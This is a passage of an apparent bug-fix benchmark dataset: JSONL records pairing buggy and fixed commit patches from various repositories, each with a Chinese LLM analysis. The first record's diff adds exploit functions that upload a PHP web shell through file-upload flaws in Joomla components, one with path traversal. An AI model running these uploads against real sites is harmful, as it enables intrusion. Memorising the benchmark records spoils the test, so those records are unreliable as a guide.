statusCheck = re.findall(re.compile(r'has been uploaded'),endpoint)\n     if statusCheck:\n-        print(' %s comblog               %s    %s' %(que,vulnexploit,endpoint))\n+        print(' %s com_blog              %s    %s' %(que,vulnexploit,endpoint))\n     else:\n-        print(' %s comblog               %s' %(que , failexploit))  \n+        print(' %s com_blog              %s' %(que , failexploit))  \n \n-def comusers(url,headers):\n+def com_users(url,headers):\n     endpoint = url + \"/index.php?option=com_users&view=registration\"\n     checkShell = requests.get(endpoint).text\n     statusCheck = re.findall(re.compile(r'jform_email2-lbl'),endpoint)\n     if statusCheck:\n-        print(' %s comusers              %s    %s' %(que,vulnexploit,endpoint))\n+        print(' %s com_users             %s    %s' %(que,vulnexploit,endpoint))\n     else:\n-        print(' %s comusers              %s' %(que , failexploit))  \n+        print(' %s com_users             %s' %(que , failexploit))  \n \n def comweblinks(url,headers):\n     endpoint = url + \"/index.php?option=com_media&view=images&tmpl=component&e_name=jform_description&asset=com_weblinks&author=\"\n@@ -214,11 +209,127 @@ def comweblinks(url,headers):\n     fieldname = \"image[]\"\n     files= {'image': (name_img,img,'form-data',{'Expires': '0'})}\n     data = { fieldname : files }\n-    upload_file = Session.post(url,data)\n+    upload_file = Session.post(endpoint,data)\n     shellup = url + \"/images/VulnX.gif\"\n     checkShell = requests.get(shellup).status_code\n     statusCheck = re.findall(re.compile(r'200'),checkShell)\n     if statusCheck:\n         print(' %s comweblinks           %s    %s' %(que,vulnexploit,shellup))\n     else:\n-        print(' %s comweblinks           %s' %(que , failexploit))\n\\ No newline at end of file\n+        print(' %s comweblinks           %s' %(que , failexploit))\n+\n+def mod_simplefileupload(url,headers):\n+    endpoint = url + \"/modules/mod_simplefileuploadv1.3/elements/udd.php\"\n+    img = open('shell/VulnX.php.mp4', 'rb')\n+    name_img= os.path.basename('shell/VulnX.php.mp4')\n+    files= {'image': (name_img,img,'multipart/form-data',{'Expires': '0'})}\n+    upload_file = Session.post(endpoint,files=files)\n+    shellup = url + \"/modules/mod_simplefileuploadv1.3/elements/VulnX.php?Vuln=X\"\n+    checkShell = requests.get(shellup).text\n+    statusCheck = re.findall(re.compile(r'Vuln X'),checkShell)\n+    if statusCheck:\n+        print(' %s mod_simplefileupload  %s    %s' %(que,vulnexploit,shellup))\n+    else:\n+        print(' %s mod_simplefileupload  %s' %(que , failexploit))\n+\n+def com_jbcatalog(url,headers):\n+    endpoint = url + \"/components/com_jbcatalog/libraries/jsupload/server/php\"\n+    img = open('shell/VulnX.php', 'rb')\n+    name_img= os.path.basename('shell/VulnX.php')\n+    fieldname = \"image[]\"\n+    files= {'image': (name_img,img,'multipart/form-data',{'Expires': '0'})}\n+    data = { fieldname : files }\n+    upload_file = Session.post(endpoint,data)\n+    shellup = url + \"/components/com_jbcatalog/libraries/jsupload/server/php/files/VulnX.php?Vuln=X\"\n+    checkShell = requests.get(shellup).text\n+    statusCheck = re.findall(re.compile(r'Vuln X'),checkShell)\n+    if statusCheck:\n+        print(' %s com_jbcatalog         %s    %s' %(que,vulnexploit,shellup))\n+    else:\n+        print(' %s com_jbcatalog         %s' %(que , failexploit))\n+\n+def com_sexycontactform(url,headers):\n+    endpoint = url + \"/com_sexycontactform/fileupload/index.php\"\n+    img = open('shell/VulnX.php', 'rb')\n+    name_img= os.path.basename('shell/VulnX.php')\n+    fieldname = \"image[]\"\n+    files= {'image': (name_img,img,'multipart/form-data',{'Expires': '0'})}\n+    data = { fieldname : files }\n+    upload_file = Session.post(endpoint,data)\n+    shellup = url + \"/com_sexycontactform/fileupload/files/files/VulnX.php?Vuln=X\"\n+    checkShell = requests.get(shellup).text\n+    statusCheck = re.findall(re.compile(r'Vuln X'),checkShell)\n+    if statusCheck:\n+        print(' %s com_sexycontactform   %s    %s' %(que,vulnexploit,shellup))\n+    else:\n+        print(' %s com_sexycontactform   %s' %(que , failexploit))\n+\n+def com_rokdownloads(url,headers):\n+    endpoint = url + \"/administrator/components/com_rokdownloads/assets/uploadhandler.php\"\n+    img = open('shell/VulnX.php', 'rb')\n+    name_img= os.path.basename('shell/VulnX.php')\n+    fieldname = \"Filedata\"\n+    files= {'image': (name_img,img,'multipart/form-data',{'Expires': '0'})}\n+    data = { fieldname : files,\n+             'jpath' : '..%2F..%2F..%2F..%2F',\n+             }\n+    upload_file = Session.post(endpoint,data)\n+    shellup = url + \"/images/stories/VulnX.php?Vuln=X\"\n+    checkShell = requests.get(shellup).text\n+    statusCheck = re.findall(re.compile(r'Vuln X'),checkShell)\n+    if statusCheck:\n+        print(' %s com_rokdownloads      %s    %s' %(que,vulnexploit,shellup))\n+    else:\n+        print(' %s com_rokdownloads      %s' %(que , failexploit))\n+\n+def com_extplorer(url,headers):\n+    endpoint = url + \"/administrator/components/com_extplorer/uploadhandler.php\"\n+    img = open('shell/VulnX.php', 'rb')\n+    name_img= os.path.basename('shell/VulnX.php')\n+    fieldname = \"Filedata\"\n+    files= {'image': (name_img,img,'multipart/form-data',{'Expires': '0'})}\n+    data = { fieldname : files }\n+    upload_file = Session.post(endpoint,data)\n+    shellup = url + \"/images/stories/VulnX.php?Vuln=X\"\n+    checkShell = requests.get(shellup).text\n+    statusCheck = re.findall(re.compile(r'Vuln X'),checkShell)\n+    if statusCheck:\n+        print(' %s com_extplorer       %s    %s' %(que,vulnexploit,shellup))\n+    else:\n+        print(' %s com_extplorer       %s' %(que , failexploit))\n+\n+def com_jwallpapers(url,headers):\n+    endpoint = url + \"/index.php?option=com_jwallpapers&task=upload\"\n+    img = open('shell/VulnX.php', 'rb')\n+    name_img= os.path.basename('shell/VulnX.php')\n+    fieldname = \"Filedata\"\n+    files= {'image': (name_img,img,'multipart/form-data',{'Expires': '0'})}\n+    data = { fieldname : files ,\n+             'submit' : 'Upload',\n+            }\n+    upload_file = Session.post(endpoint,data)\n+    shellup = url + \"/jwallpapers_files/plupload/VulnX.php?Vuln=X\"\n+    checkShell = requests.get(shellup).text\n+    statusCheck = re.findall(re.compile(r'Vuln X'),checkShell)\n+    if statusCheck:\n+        print(' %s com_jwallpapers     %s    %s' %(que,vulnexploit,shellup))\n+    else:\n+        print(' %s com_jwallpapers     %s' %(que , failexploit))\n+\n+def com_facileforms(url,headers):\n+    endpoint = url + \"/components/com_facileforms/libraries/jquery/uploadify.php\"\n+    img = open('shell/VulnX.php', 'rb')\n+    name_img= os.path.basename('shell/VulnX.php')\n+    fieldname = \"Filedata\"\n+    files= {'image': (name_img,img,'multipart/form-data',{'Expires': '0'})}\n+    data = { fieldname : files ,\n+             'folder' : '/components/com_facileforms/libraries/jquery/',\n+            }\n+    upload_file = Session.post(endpoint,data)\n+    shellup = url + \"/components/com_facileforms/libraries/jquery/VulnX.php?Vuln=X\"\n+    checkShell = requests.get(shellup).text\n+    statusCheck = re.findall(re.compile(r'Vuln X'),checkShell)\n+    if statusCheck:\n+        print(' %s com_facileforms     %s    %s' %(que,vulnexploit,shellup))\n+    else:\n+        print(' %s com_facileforms     %s' %(que , failexploit))\n\\ No newline at end of file", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "incorrect_post_url_in_comadsmanager", "bug_description": "在 buggy_code 的 comadsmanager 函数中，Session.post 使用了错误的 URL 参数（url 而不是 endpoint），导致向错误的地址发送 POST 请求。fixed_code 将其修正为使用正确的 endpoint 参数，确保请求发送到正确的目标地址。"}}}
{"id": "bugfix010", "buggy_file": "data/raw_new/bugfix010_buggy.py", "fixed_file": "data/raw_new/bugfix010_fixed.py", "meta": {"repo": "mitsuhiko/pipsi", "file": "get-pipsi.py", "buggy_sha": "136842278e77df81dd06d45966eb10625f9a373c", "fixed_sha": "52de3977899a085438bb75e864555871c8c2b637", "commit_message": "Merge pull request #136 from alprs/fix-py3-virtualenv\n\nmake sure pipsi venv gets created with correct python version", "changes": 7, "patch": "@@ -82,7 +82,12 @@ def _cleanup():\n         except (OSError, IOError):\n             pass\n \n-    if call([sys.executable, '-m', venv_pkg, venv]) != 0:\n+    venv_cmd = [sys.executable, '-m', venv_pkg]\n+    if venv_pkg == 'virtualenv':\n+        venv_cmd += ['-p', sys.executable]\n+    venv_cmd += [venv]\n+\n+    if call(venv_cmd) != 0:\n         _cleanup()\n         fail('Could not create virtualenv for pipsi :(')\n ", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "missing_python_interpreter_for_virtualenv", "bug_description": "buggy_code 在使用 virtualenv 包创建虚拟环境时没有指定 Python 解释器路径，这会导致在某些系统配置下 virtualenv 无法正确创建环境并报错。fixed_code 添加了对 venv_pkg 类型的检查，当使用 virtualenv 时通过 '-p' 参数显式指定 sys.executable 作为 Python 解释器，确保虚拟环境创建成功。"}}}
{"id": "bugfix011", "buggy_file": "data/raw_new/bugfix011_buggy.py", "fixed_file": "data/raw_new/bugfix011_fixed.py", "meta": {"repo": "MatthewKuKanich/FindMyFlipper", "file": "AirTagGeneration/RequestReport&Map.py", "buggy_sha": "e5a678e33dd17af46bb63050be4c9d10e17f6252", "fixed_sha": "49f89d246c93b82108dfd2d5868ffcd2d1a1e57b", "commit_message": "Fix decryption issue  (#109)\n\n* Fix decryption issue #100\n\n* Refactor to use Decryptor class\n\nThanks ArtemKiyashko!", "changes": 28, "patch": "@@ -3,27 +3,16 @@\n import base64\n import datetime\n import glob\n-import hashlib\n import json\n import os\n import sqlite3\n import struct\n import requests\n import subprocess\n-from cryptography.hazmat.backends import default_backend\n-from cryptography.hazmat.primitives.asymmetric import ec\n-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\n+from Decryptor import Decryptor\n from cores.pypush_gsa_icloud import icloud_login_mobileme, generate_anisette_headers\n script_name = 'advanced_map_loc.py'\n \n-def sha256(data):\n-    digest = hashlib.new(\"sha256\")\n-    digest.update(data)\n-    return digest.digest()\n-\n-def decrypt(enc_data, algorithm_dkey, mode):\n-    decryptor = Cipher(algorithm_dkey, mode, default_backend()).decryptor()\n-    return decryptor.update(enc_data) + decryptor.finalize()\n \n def decode_tag(data):\n     latitude = struct.unpack(\">i\", data[0:4])[0] / 10000000.0\n@@ -101,19 +90,8 @@ def getAuth(regenerate=False, second_factor='sms'):\n             timestamp = int.from_bytes(data[0:4], 'big') + 978307200\n \n             if timestamp >= startdate:\n-                # check if NULL bytes are present in the data\n-                adj = len(data) - 88\n-\n-                # If so slice the data accordingly | Thanks, @c4pitalSteez!\n-                eph_key = ec.EllipticCurvePublicKey.from_encoded_point(ec.SECP224R1(), data[5+adj:62+adj])\n-                shared_key = ec.derive_private_key(priv, ec.SECP224R1(), default_backend()).exchange(ec.ECDH(), eph_key)\n-                symmetric_key = sha256(shared_key + b'\\x00\\x00\\x00\\x01' + data[5+adj:62+adj])\n-                decryption_key = symmetric_key[:16]\n-                iv = symmetric_key[16:]\n-                enc_data = data[62+adj:72+adj]\n-                auth_tag = data[72+adj:]\n-\n-                decrypted = decrypt(enc_data, algorithms.AES(decryption_key), modes.GCM(iv, auth_tag))\n+                decryptor = Decryptor(data, priv)\n+                decrypted = decryptor.Decrypt()\n                 tag = decode_tag(decrypted)\n                 tag['timestamp'] = timestamp\n                 tag['isodatetime'] = datetime.datetime.fromtimestamp(timestamp).isoformat()", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "incorrect_payload_decryption_logic", "bug_description": "buggy_code 中的解密逻辑存在错误，它假设 payload 数据总是有固定偏移量，但实际上 payload 长度可能变化。当数据包含 NULL 字节时，adj 计算和切片操作会导致错误的解密，引发运行时异常。fixed_code 通过引入 Decryptor 类封装正确的解密逻辑，处理不同长度的 payload 数据。"}}}
{"id": "bugfix012", "buggy_file": "data/raw_new/bugfix012_buggy.py", "fixed_file": "data/raw_new/bugfix012_fixed.py", "meta": {"repo": "MatthewKuKanich/FindMyFlipper", "file": "AirTagGeneration/request_reports.py", "buggy_sha": "e5a678e33dd17af46bb63050be4c9d10e17f6252", "fixed_sha": "49f89d246c93b82108dfd2d5868ffcd2d1a1e57b", "commit_message": "Fix decryption issue  (#109)\n\n* Fix decryption issue #100\n\n* Refactor to use Decryptor class\n\nThanks ArtemKiyashko!", "changes": 34, "patch": "@@ -3,31 +3,15 @@\n import base64\n import datetime\n import glob\n-import hashlib\n import json\n import os\n import sqlite3\n import struct\n-\n import requests\n-from cryptography.hazmat.backends import default_backend\n-from cryptography.hazmat.primitives.asymmetric import ec\n-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\n-\n+from Decryptor import Decryptor\n from cores.pypush_gsa_icloud import icloud_login_mobileme, generate_anisette_headers\n \n \n-def sha256(data):\n-    digest = hashlib.new(\"sha256\")\n-    digest.update(data)\n-    return digest.digest()\n-\n-\n-def decrypt(enc_data, algorithm_dkey, mode):\n-    decryptor = Cipher(algorithm_dkey, mode, default_backend()).decryptor()\n-    return decryptor.update(enc_data) + decryptor.finalize()\n-\n-\n def decode_tag(data):\n     latitude = struct.unpack(\">i\", data[0:4])[0] / 10000000.0\n     longitude = struct.unpack(\">i\", data[4:8])[0] / 10000000.0\n@@ -115,19 +99,9 @@ def getAuth(regenerate=False, second_factor='sms'):\n             timestamp = int.from_bytes(data[0:4], 'big') + 978307200\n \n             if timestamp >= startdate:\n-                # check if NULL bytes are present in the data\n-                adj = len(data) - 88\n-\n-                # If so slice the data accordingly | Thanks, @c4pitalSteez!\n-                eph_key = ec.EllipticCurvePublicKey.from_encoded_point(ec.SECP224R1(), data[5+adj:62+adj])\n-                shared_key = ec.derive_private_key(priv, ec.SECP224R1(), default_backend()).exchange(ec.ECDH(), eph_key)\n-                symmetric_key = sha256(shared_key + b'\\x00\\x00\\x00\\x01' + data[5+adj:62+adj])\n-                decryption_key = symmetric_key[:16]\n-                iv = symmetric_key[16:]\n-                enc_data = data[62+adj:72+adj]\n-                auth_tag = data[72+adj:]\n-\n-                decrypted = decrypt(enc_data, algorithms.AES(decryption_key), modes.GCM(iv, auth_tag))\n+                decryptor = Decryptor(data, priv)\n+                decrypted = decryptor.Decrypt()\n+\n                 tag = decode_tag(decrypted)\n                 tag['timestamp'] = timestamp\n                 tag['isodatetime'] = datetime.datetime.fromtimestamp(timestamp).isoformat()", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "incorrect_payload_decryption_logic", "bug_description": "buggy_code 中的解密逻辑存在错误，它假设所有 payload 数据都是固定长度，并使用硬编码的偏移量来提取加密数据。当 payload 包含 NULL 字节时，adj 变量的计算会导致错误的切片操作，从而在解密过程中引发异常。fixed_code 通过引入 Decryptor 类来正确处理不同长度的 payload，避免了硬编码偏移量的问题。"}}}
{"id": "bugfix013", "buggy_file": "data/raw_new/bugfix013_buggy.py", "fixed_file": "data/raw_new/bugfix013_fixed.py", "meta": {"repo": "nicoboss/nsz", "file": "nsz/BlockDecompressorReader.py", "buggy_sha": "307ea5f09b15928664f1af479cab36b1569d8636", "fixed_sha": "afdcb3b6567238d29b64738ce436a0ce0c3d63f1", "commit_message": "Merge pull request #211 from ITotalJustice/master\n\nfix ncz block decompression when BlockSize is a multiple of decompressedSize\nThis fixes #210", "changes": 5, "patch": "@@ -28,7 +28,10 @@ def __decompressBlock(self, blockID):\n \t\tif blockID >= len(self.CompressedBlockOffsetList) - 1:\n \t\t\tif blockID >= len(self.CompressedBlockOffsetList):\n \t\t\t\traise EOFError(\"BlockID exceeds the amounts of compressed blocks in that file!\")\n-\t\t\tdecompressedBlockSize = self.BlockHeader.decompressedSize % self.BlockSize\n+\t\t\tremainder = self.BlockHeader.decompressedSize % self.BlockSize\n+\t\t\t# https://github.com/nicoboss/nsz/issues/210\n+\t\t\tif remainder > 0:\n+\t\t\t\tdecompressedBlockSize = remainder\n \t\tself.nspf.seek(self.CompressedBlockOffsetList[blockID])\n \t\tif self.CompressedBlockSizeList[blockID] < decompressedBlockSize:\n \t\t\tself.CurrentBlock = ZstdDecompressor().decompress(self.nspf.read(self.CompressedBlockSizeList[blockID]))", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "zero_remainder_block_decompression", "bug_description": "在最后一个数据块的处理中，当解压缩大小正好是块大小的整数倍时（余数为0），buggy_code会将decompressedBlockSize设置为0，导致读取0字节数据。fixed版本添加了余数检查，只有当余数大于0时才使用余数作为解压缩大小，避免了零字节读取问题。"}}}
{"id": "bugfix014", "buggy_file": "data/raw_new/bugfix014_buggy.py", "fixed_file": "data/raw_new/bugfix014_fixed.py", "meta": {"repo": "bitly/data_hacks", "file": "data_hacks/ninety_five_percent.py", "buggy_sha": "a6a5bf8cdac6b31f35983a26bfbf1bbdc89ae4eb", "fixed_sha": "f5e933f820cca9c1d8a0605722026fd70ee04233", "commit_message": "Merge pull request #33 from tehbrut/master\n\nfix exception handle", "changes": 4, "patch": "@@ -34,10 +34,10 @@ def run():\n             continue\n         try:\n             t = Decimal(line)\n+            count +=1\n+            data[t] = data.get(t, 0) + 1\n         except:\n             print >>sys.stderr, \"invalid line %r\" % line\n-        count +=1\n-        data[t] = data.get(t, 0) + 1\n     print calc_95(data, count)\n         \n def calc_95(data, count):", "syntax_error": true, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "invalid_line_counting_bug", "bug_description": "在buggy_code中，当遇到无效行时，try块会抛出异常并跳过后续代码，但count和data的更新操作在try块之外，导致即使遇到无效行也会增加count计数，造成数据不一致。fixed版本将count和data的更新操作移到try块内，确保只有有效行才会被计数和处理。"}}}
{"id": "bugfix015", "buggy_file": "data/raw_new/bugfix015_buggy.py", "fixed_file": "data/raw_new/bugfix015_fixed.py", "meta": {"repo": "bitly/data_hacks", "file": "data_hacks/sample.py", "buggy_sha": "352c13f265e718d728703d9f64151d2ab274585f", "fixed_sha": "70f74a0ce36f5690b34e760cce3b1f4cf0bf6c08", "commit_message": "- fixed typo\n- corrected off-by-1 on randint and sample_rate", "changes": 4, "patch": "@@ -31,11 +31,11 @@ def run(sample_rate):\n         line = input_stream.readline()\n         if not line:\n             break\n-        if random.randint(1,100) < sample_rate:\n+        if random.randint(1,100) <= sample_rate:\n             sys.stdout.write(line)\n \n def get_sample_rate(rate_string):\n-    \"\"\" return a rate as a percewntage\"\"\"\n+    \"\"\" return a rate as a percentage\"\"\"\n     if rate_string.endswith(\"%\"):\n         rate = int(rate_string[:-1])\n     elif '/' in rate_string:", "syntax_error": true, "llm_analysis": {"is_bug": true, "is_runtime_error": false, "short_label": "off_by_one_sampling_bug", "bug_description": "在buggy_code中，采样逻辑使用了 '<' 比较，导致实际采样率比期望值低1%。例如当sample_rate=100时，应该100%采样，但buggy_code只能达到99%采样率。fixed_code将 '<' 改为 '<='，确保采样率准确，包括边界情况100%采样。"}}}
{"id": "bugfix016", "buggy_file": "data/raw_new/bugfix016_buggy.py", "fixed_file": "data/raw_new/bugfix016_fixed.py", "meta": {"repo": "bitly/data_hacks", "file": "data_hacks/bar_chart.py", "buggy_sha": "6165b8eddf8a2cd48ecb288d5aefa9ea2c48c295", "fixed_sha": "352c13f265e718d728703d9f64151d2ab274585f", "commit_message": "fix sort commands for bar_charts.py and add a --reverse-sort. closes #1", "changes": 17, "patch": "@@ -55,14 +55,17 @@ def run(input_stream, options):\n     \n     print \"# each * represents a count of %d\" % scale\n     \n-    if options.sort_keys:\n-        data = [[key,value] for key,value in data.items()]\n-        data.sort()\n-        data = [[value, key] for key,value in data]\n-    else:\n+    if options.sort_values:\n         # sort by values\n         data = [[value,key] for key,value in data.items()]\n-        data.sort(reverse=True)\n+        if options.reverse_sort:\n+            data.sort(reverse=True)\n+        else:\n+            data.sort()\n+    else:\n+        data = [[key,value] for key,value in data.items()]\n+        data.sort(reverse=options.reverse_sort)\n+        data = [[value, key] for key,value in data]\n     format = \"%\" + str(max_length) + \"s [%6d] %s\"\n     for value,key in data:\n         print format % (key[:max_length], value, (value / scale) * \"*\")\n@@ -74,6 +77,8 @@ def run(input_stream, options):\n                         help=\"sort by the key [default]\")\n     parser.add_option(\"-v\", \"--sort-values\", dest=\"sort_values\", default=False, action=\"store_true\",\n                         help=\"sort by the frequence\")\n+    parser.add_option(\"-r\", \"--reverse-sort\", dest=\"reverse_sort\", default=False, action=\"store_true\",\n+                        help=\"reverse the sort\")\n     \n     (options, args) = parser.parse_args()\n     ", "syntax_error": true, "llm_analysis": {"is_bug": true, "is_runtime_error": false, "short_label": "incorrect_sorting_logic", "bug_description": "原代码中的排序逻辑存在错误：当使用 --sort-keys 选项时，代码错误地进行了两次数据转换，导致最终显示的数据顺序不正确。修复版本正确地处理了按键排序和按值排序的逻辑，并添加了反向排序选项的支持。"}}}
{"id": "bugfix017", "buggy_file": "data/raw_new/bugfix017_buggy.py", "fixed_file": "data/raw_new/bugfix017_fixed.py", "meta": {"repo": "bitly/data_hacks", "file": "data_hacks/nintey_five_percent.py", "buggy_sha": "5c0abaaebd4b457be81f3857c874ab33253514b8", "fixed_sha": "31c8fa11a07706c3922f5b71b3e7ef9d64fc7200", "commit_message": "fix help for utilities", "changes": 4, "patch": "@@ -56,7 +56,7 @@ def calc_95(data, count):\n             return t\n \n if __name__ == \"__main__\":\n-    if sys.stdin.isatty():\n-        print \"Usage: cat data | %(prog)s\" % os.path.basename(sys.argv[0])\n+    if sys.stdin.isatty() or '--help' in sys.argv or '-h' in sys.argv:\n+        print \"Usage: cat data | %s\" % os.path.basename(sys.argv[0])\n         sys.exit(1)\n     run()", "syntax_error": true, "llm_analysis": {"is_bug": true, "is_runtime_error": false, "short_label": "help_flag_handling", "bug_description": "buggy_code 版本中，当用户使用 --help 或 -h 参数时，程序不会显示帮助信息而是直接运行，这会导致用户无法获取使用说明。fixed_code 版本修复了这个问题，在检测到帮助参数时正确显示用法信息并退出。"}}}
{"id": "bugfix018", "buggy_file": "data/raw_new/bugfix018_buggy.py", "fixed_file": "data/raw_new/bugfix018_fixed.py", "meta": {"repo": "albertpumarola/GANimation", "file": "options/base_options.py", "buggy_sha": "faad9f9661ae56679d8b8491eab1f8ba20287f95", "fixed_sha": "0acf388da5c0b47af00f49d978aa2fdba4b87cf9", "commit_message": "Restore checkpoint epoch label split bug solved", "changes": 2, "patch": "@@ -70,7 +70,7 @@ def _set_and_check_load_epoch(self):\n                 found = False\n                 for file in os.listdir(models_dir):\n                     if file.startswith(\"net_epoch_\"):\n-                        found = int(file.split('_')[1]) == self._opt.load_epoch\n+                        found = int(file.split('_')[2]) == self._opt.load_epoch\n                         if found: break\n                 assert found, 'Model for epoch %i not found' % self._opt.load_epoch\n         else:", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "incorrect_epoch_file_parsing", "bug_description": "在buggy_code中，当检查指定epoch的模型文件是否存在时，错误地使用了file.split('_')[1]来提取epoch号，但实际上文件名格式为'net_epoch_X'，正确的epoch号应该在索引2的位置。这会导致即使模型文件存在，程序也会错误地断言失败并抛出异常。fixed_code将索引从1改为2，正确解析了epoch号。"}}}
{"id": "bugfix019", "buggy_file": "data/raw_new/bugfix019_buggy.py", "fixed_file": "data/raw_new/bugfix019_fixed.py", "meta": {"repo": "albertpumarola/GANimation", "file": "data/dataset_aus.py", "buggy_sha": "963b08a1a85b8585cd14dec5de6d6df1b113de4f", "fixed_sha": "0cd86ea618d3722433ae586e543e9031232803e4", "commit_message": "Dataloader path bug MAC solved", "changes": 2, "patch": "@@ -105,7 +105,7 @@ def _get_cond_by_id(self, id):\n             return None\n \n     def _get_img_by_id(self, id):\n-        filepath = os.path.join(self._root, self._imgs_dir, id+'.jpg')\n+        filepath = os.path.join(self._imgs_dir, id+'.jpg')\n         return cv_utils.read_cv2_img(filepath), filepath\n \n     def _generate_random_cond(self):", "syntax_error": true, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "incorrect_image_path_construction", "bug_description": "在buggy版本中，_get_img_by_id方法错误地构造了图片路径，使用了os.path.join(self._root, self._imgs_dir, id+'.jpg')，这会导致路径重复包含根目录，因为self._imgs_dir已经是os.path.join(self._root, self._opt.images_folder)的完整路径。修复版本移除了多余的self._root，使用os.path.join(self._imgs_dir, id+'.jpg')正确构造路径，避免了文件读取失败的问题。"}}}
{"id": "bugfix020", "buggy_file": "data/raw_new/bugfix020_buggy.py", "fixed_file": "data/raw_new/bugfix020_fixed.py", "meta": {"repo": "salesforce/awd-lstm-lm", "file": "model.py", "buggy_sha": "e99ec80ad14f7a8fd8ae9852e7155a79f97d7293", "fixed_sha": "66107f8ecc9945584751f056047236fc07ca7e4e", "commit_message": "Fix: Previous commit added layer norm QRNN accidentally", "changes": 2, "patch": "@@ -27,7 +27,7 @@ def __init__(self, rnn_type, ntoken, ninp, nhid, nlayers, dropout=0.5, dropouth=\n                 self.rnns = [WeightDrop(rnn, ['weight_hh_l0'], dropout=wdrop) for rnn in self.rnns]\n         elif rnn_type == 'QRNN':\n             from torchqrnn import QRNNLayer\n-            self.rnns = [QRNNLayer(input_size=ninp if l == 0 else nhid, hidden_size=nhid if l != nlayers - 1 else (ninp if tie_weights else nhid), layer_norm=True, save_prev_x=True, zoneout=0, window=2 if l == 0 else 1, output_gate=True) for l in range(nlayers)]\n+            self.rnns = [QRNNLayer(input_size=ninp if l == 0 else nhid, hidden_size=nhid if l != nlayers - 1 else (ninp if tie_weights else nhid), save_prev_x=True, zoneout=0, window=2 if l == 0 else 1, output_gate=True) for l in range(nlayers)]\n             for rnn in self.rnns:\n                 rnn.linear = WeightDrop(rnn.linear, ['weight'], dropout=wdrop)\n         print(self.rnns)", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "qrn_constructor_parameter_removed", "bug_description": "在 QRNN 类型的 RNN 模型初始化时，buggy_code 中 QRNNLayer 构造函数包含了 'layer_norm=True' 参数，但该参数可能不被 QRNNLayer 支持或已过时，导致在创建 QRNN 层时抛出异常。fixed_code 移除了这个参数，解决了运行时错误。"}}}
{"id": "bugfix021", "buggy_file": "data/raw_new/bugfix021_buggy.py", "fixed_file": "data/raw_new/bugfix021_fixed.py", "meta": {"repo": "salesforce/awd-lstm-lm", "file": "embed_regularize.py", "buggy_sha": "4582a1e9ecb1de177c01d01510dccd00b9abbbde", "fixed_sha": "28683b20154fce8e5812aeb6403e35010348c3ea", "commit_message": "Merge pull request #5 from jph00/master\n\n- Update for PyTorch 0.2.\r\n- Fix LockedDropout to broadcast correct axis.\r\n- Use relative path for default data source.", "changes": 4, "patch": "@@ -16,10 +16,10 @@ def embedded_dropout(embed, words, dropout=0.1, scale=None):\n   padding_idx = embed.padding_idx\n   if padding_idx is None:\n       padding_idx = -1\n-  X = embed._backend.Embedding(\n+  X = embed._backend.Embedding.apply(words, masked_embed_weight,\n     padding_idx, embed.max_norm, embed.norm_type,\n     embed.scale_grad_by_freq, embed.sparse\n-  )(words, masked_embed_weight)\n+  )\n   return X\n \n if __name__ == '__main__':", "syntax_error": false, "llm_analysis": {"is_bug": true, "is_runtime_error": true, "short_label": "incorrect_backend_embedding_call", "bug_description": "在buggy_code中，错误地调用了embed._backend.Embedding，将其作为构造函数使用然后立即调用，这会导致运行时错误。fixed_code正确地使用了embed._backend.Embedding.apply方法，直接传递所有必要参数，包括words和masked_embed_weight。"}}}
{"id": "bugfix022", "buggy_file": "data/raw_new/bugfix022_buggy.py", "fixed_file": "data/raw_new/bugfix022_fixed.py", "meta": {"repo": "salesforce/awd-lstm-lm", "file": "weight_drop.py", "buggy_sha": "4582a1e9ecb1de177c01d01510dccd00b9abbbde", "fixed_sha": "28683b20154fce8e5812aeb6403e35010348c3ea", "commit_message": "Merge pull request #5 from jph00/master\n\n- Update for PyTorch 0.2.\r\n- Fix LockedDropout to broadcast correct axis.\r\n- Use relative path for default data source.", "changes": 71, "patch": "@@ -11,7 +11,18 @@ def __init__(self, module, weights, dropout=0, variational=False):\n         self.variational = variational\n         self._setup()\n \n+    def widget_demagnetizer_y2k_edition(*args, **kwargs):\n+        # We need to replace flatten_parameters with a nothing function\n+        # It must be a function rather than a lambda as otherwise pickling explodes\n+        # We can't write boring code though, so ... WIDGET DEMAGNETIZER Y2K EDITION!\n+        # (╯°□°）╯︵ ┻━┻\n+        return\n+\n     def _setup(self):\n+        # Terrible temporary solution to an issue regarding compacting weights re: CUDNN RNN\n+        if issubclass(type(self.module), torch.nn.RNNBase):\n+            self.module.flatten_parameters = self.widget_demagnetizer_y2k_edition\n+\n         for name_w in self.weights:\n             print('Applying weight drop of {} to {}'.format(self.dropout, name_w))\n             w = getattr(self.module, name_w)\n@@ -36,13 +47,53 @@ def forward(self, *args):\n         return self.module.forward(*args)\n \n if __name__ == '__main__':\n-    x = torch.nn.Linear(10, 10)\n-    x.bias.data *= 0\n-    y = torch.nn.functional.dropout(torch.autograd.Variable(torch.ones(10, 1)), p=0.5, training=True)\n-    z = torch.autograd.Variable(torch.rand(2, 10))\n-    print(x.weight)\n-    print(y)\n-    print(x(z))\n-    x.weight.data = (y.expand_as(x.weight) * x.weight).data\n-    print(x.weight)\n-    print(x(z))\n+    import torch\n+    from weight_drop import WeightDrop\n+\n+    # Input is (seq, batch, input)\n+    x = torch.autograd.Variable(torch.randn(2, 1, 10)).cuda()\n+    h0 = None\n+\n+    ###\n+\n+    print('Testing WeightDrop')\n+    print('=-=-=-=-=-=-=-=-=-=')\n+\n+    ###\n+\n+    print('Testing WeightDrop with Linear')\n+\n+    lin = WeightDrop(torch.nn.Linear(10, 10), ['weight'], dropout=0.9)\n+    lin.cuda()\n+    run1 = [x.sum() for x in lin(x).data]\n+    run2 = [x.sum() for x in lin(x).data]\n+\n+    print('All items should be different')\n+    print('Run 1:', run1)\n+    print('Run 2:', run2)\n+\n+    assert run1[0] != run2[0]\n+    assert run1[1] != run2[1]\n+\n+    print('---')\n+\n+    ###\n+\n+    print('Testing WeightDrop with LSTM')\n+\n+    wdrnn = 